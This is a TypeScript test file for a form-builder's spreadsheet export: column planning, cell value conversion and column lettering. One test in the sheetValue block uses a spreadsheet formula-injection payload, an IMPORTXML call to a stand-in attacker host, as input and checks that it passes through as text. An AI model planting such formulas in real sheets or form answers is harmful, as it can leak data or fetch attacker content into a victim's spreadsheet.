import { describe, expect, it } from 'vitest';
import { createEmptyForm, createField, createOption } from '../forms/factories.js';
import type { FormSchema } from '../forms/form-schema.js';
import type { SubmissionRecord } from '../forms/responses.js';
import {
  columnLetters,
  planSheetColumns,
  RESPONSE_ID_KEY,
  sheetValue,
  type SheetSources,
} from './sheet-columns.js';

const name = { ...createField('short_text'), id: 'fld_name', label: 'Name' };
const guests = { ...createField('number'), id: 'fld_guests', label: 'Guests' };
const day = { ...createField('date'), id: 'fld_day', label: 'Arrival' };
const size = {
  ...createField('single_choice'),
  id: 'fld_size',
  label: 'Size',
  options: [createOption('Small'), createOption('Large')],
};

const schema = (...fields: FormSchema['fields']): FormSchema => ({ ...createEmptyForm(), fields });
const plain: SheetSources = { collectsEmail: false, allowsEdits: false };

const response = (answers: SubmissionRecord['answers'], extra: Partial<SubmissionRecord> = {}) =>
  ({
    id: 'sub_1',
    createdAt: '2026-10-12T09:30:00.000Z',
    completionTimeMs: 61_400,
    answers,
    metadata: { userAgent: null, referrer: null },
    outcome: null,
    ...extra,
  }) satisfies SubmissionRecord;

const headers = (plan: ReturnType<typeof planSheetColumns>) =>
  plan.columns.map((column) => column.header);

describe('planSheetColumns', () => {
  it('starts a sheet with the response id, the time, each question and the time taken', () => {
    const plan = planSheetColumns(null, schema(name, guests), plain);
    expect(headers(plan)).toEqual([
      'Response ID',
      'Submitted at (UTC)',
      'Name',
      'Guests',
      'Time to complete (seconds)',
    ]);
    expect(plan.columns[0]?.key).toBe(RESPONSE_ID_KEY);
    expect(plan.added).toEqual(plan.columns);
    expect(plan.columns.map((column) => column.kind)).toEqual([
      'text',
      'datetime',
      'text',
      'number',
      'number',
    ]);
  });

  it('adds a new question as a new column at the end, moving nothing', () => {
    const first = planSheetColumns(null, schema(name, guests), plain);
    const next = planSheetColumns(first.columns, schema(name, size, guests), plain);

    expect(headers(next)).toEqual([...headers(first), 'Size']);
    expect(next.added).toEqual([{ key: 'field:fld_size', header: 'Size', kind: 'text' }]);
    expect(next.headersChanged).toBe(true);
  });

  it('keeps a renamed question in its column, with the new header', () => {
    const first = planSheetColumns(null, schema(name, guests), plain);
    const next = planSheetColumns(
      first.columns,
      schema({ ...name, label: 'Full name' }, guests),
      plain,
    );

    expect(headers(next)[2]).toBe('Full name');
    expect(next.columns.map((column) => column.key)).toEqual(
      first.columns.map((column) => column.key),
    );
    expect(next.added).toEqual([]);
    expect(next.headersChanged).toBe(true);
  });

  it('keeps a removed question’s column, leaving new rows empty there', () => {
    const first = planSheetColumns(null, schema(name, guests), plain);
    const next = planSheetColumns(first.columns, schema(guests), plain);

    expect(headers(next)).toEqual(headers(first));
    expect(next.headersChanged).toBe(false);
    expect(next.row(response({ fld_name: 'Ada', fld_guests: 2 }))).toEqual([
      'sub_1',
      { datetime: '2026-10-12T09:30:00.000Z' },
      null,
      2,
      61,
    ]);
  });

  it('changes nothing when nothing changed', () => {
    const first = planSheetColumns(null, schema(name), plain);
    const again = planSheetColumns(first.columns, schema(name), plain);
    expect(again.added).toEqual([]);
    expect(again.headersChanged).toBe(false);
  });

  it('adds the email and changed-at columns once the form asks for them', () => {
    const first = planSheetColumns(null, schema(name), plain);
    const next = planSheetColumns(first.columns, schema(name), {
      collectsEmail: true,
      allowsEdits: true,
    });
    expect(next.added.map((column) => column.header)).toEqual([
      'Respondent email',
      'Changed at (UTC)',
    ]);
    expect(
      next
        .row(
          response(
            { fld_name: 'Ada' },
            { respondentEmail: 'ada@example.com', editedAt: '2026-10-13T08:00:00.000Z' },
          ),
        )
        .slice(-2),
    ).toEqual(['ada@example.com', { datetime: '2026-10-13T08:00:00.000Z' }]);
  });

  it('fills cells by kind: options by label, dates as dates', () => {
    const [small] = size.options;
    const plan = planSheetColumns(null, schema(size, day), plain);
    expect(
      plan.row(response({ fld_size: small?.id ?? '', fld_day: '2026-12-24' })).slice(2, 4),
    ).toEqual(['Small', { date: '2026-12-24' }]);
  });

  it('gives a question with parts a column per part, each with its own key', () => {
    const address = { ...createField('address'), id: 'fld_addr', label: 'Address' };
    const plan = planSheetColumns(null, schema(address), plain);
    const keys = plan.columns.map((column) => column.key).filter((key) => key.includes('fld_addr'));
    expect(new Set(keys).size).toBe(keys.length);
    expect(keys.length).toBeGreaterThan(1);
  });
});

describe('sheetValue', () => {
  it('leaves text as text, formulas included', () => {
    expect(sheetValue('=IMPORTXML("https://evil.example", "//a")')).toBe(
      '=IMPORTXML("https://evil.example", "//a")',
    );
    expect(sheetValue(42)).toBe(42);
    expect(sheetValue(null)).toBeNull();
  });

  it('writes dates and times as spreadsheet serial numbers', () => {
    expect(sheetValue({ date: '1899-12-31' })).toBe(1);
    expect(sheetValue({ date: '2026-01-01' })).toBe(46_023);
    expect(sheetValue({ datetime: '2026-01-01T12:00:00.000Z' })).toBe(46_023.5);
    expect(sheetValue({ date: 'not a date' })).toBe('not a date');
  });
});

describe('columnLetters', () => {
  it('counts like a spreadsheet', () => {
    expect([0, 25, 26, 51, 52, 701, 702].map(columnLetters)).toEqual([
      'A',
      'Z',
      'AA',
      'AZ',
      'BA',
      'ZZ',
      'AAA',
    ]);
  });
});
